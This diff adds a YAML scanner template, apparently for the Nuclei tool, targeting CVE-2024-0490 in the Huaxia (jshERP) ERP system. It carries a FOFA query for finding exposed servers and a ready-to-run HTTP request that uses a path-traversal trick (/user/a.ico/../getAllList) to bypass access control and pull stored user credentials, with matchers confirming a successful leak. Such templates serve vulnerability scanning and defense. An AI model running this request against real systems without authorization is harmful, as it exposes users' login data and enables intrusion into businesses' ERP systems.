@@ -1,0 +1,31 @@
+id: huaxia-erp-getalllist-info-leak
+
+info:
+  name: "华夏ERP系统getAllList接口敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="jshERP-boot"
+          华夏ERP基于SpringBoot框架和SaaS架构构建，为中小企业提供开源ERP解决方案，核心功能模块包含进销存管理、财务核算、零售运营及系统权限控制。系统集成了预付款管理、财务收支、仓储调配、产品组装与拆卸及订单处理等模块，并提供库存状态监控与业务统计报表功能。该系统在getAllList接口实现中存在安全设计缺陷，攻击者可构造特定请求绕过访问控制机制，获取存储在服务器端的敏感用户凭证数据。
+  reference:
+  - CVE-2024-0490
+  tags: 华夏ERP
+
+http:
+- raw:
+  - |
+    GET /jshERP-boot/user/a.ico/../getAllList HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
+    Accept-Language: en
+    sec-ch-ua-platform: Windows
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'loginName'
